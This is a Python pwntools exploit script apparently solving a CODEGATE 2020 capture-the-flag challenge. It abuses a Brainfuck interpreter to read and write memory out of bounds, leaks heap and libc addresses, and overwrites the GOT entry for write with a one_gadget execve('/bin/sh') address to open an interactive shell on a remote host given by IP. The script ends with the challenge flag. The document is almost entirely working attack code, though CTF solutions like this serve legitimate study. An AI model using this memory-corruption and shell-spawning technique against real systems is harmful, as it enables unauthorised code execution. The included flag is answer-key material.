#!/usr/bin/env python3
from pwn import *


def read_nonzero_byte(io, off):
    io.recvuntil('>>> ')
    io.sendline('+[' + '<' * off + '[.' + '>' * (off + 1) + ']]')
    return io.recvn(1)


def read_ptr(io, off):
    result = b'\x00\x00'
    for i in range(off - 5, off + 1):
        result = read_nonzero_byte(io, i) + result
    result, = struct.unpack('<Q', result)
    return result


def write_ptr(io, off, value):
    io.recvuntil('>>> ')
    value = struct.pack('<Q', value)
    io.sendline('+[' + '<' * off + '[,>]' + '>' * (off - 5) + ']')
    io.send(value[:6])


libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
runtime = ELF('binary_flag/runtime.so')
heap = runtime.symbols['DATA'] + 0x10

if args.LOCAL:
    io = process(['python3', 'main.py'], cwd='binary_flag')
else:
    io = remote('58.229.240.181', 7777)

start_ptr = read_ptr(io, 8)
print(f'[*] start_ptr    = 0x{start_ptr:016x}')
runtime_base = start_ptr - heap
print(f'[*] runtime_base = 0x{runtime_base:016x}')
assert runtime_base & 0xfff == 0

write_addr = read_ptr(io, heap - runtime.got['write'])
print(f'[*] write_addr   = 0x{write_addr:016x}')
libc_base = write_addr - libc.symbols['write']
print(f'[*] libc_base    = 0x{libc_base:016x}')
assert libc_base & 0xfff == 0

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

write_ptr(io, heap - runtime.got['write'], libc_base + 0x10a38c)
io.recvuntil('>>> ')
io.sendline('.')

io.interactive()

# CODEGATE2020{next_time_i_should_make_a_backend_for_bf_as_well}
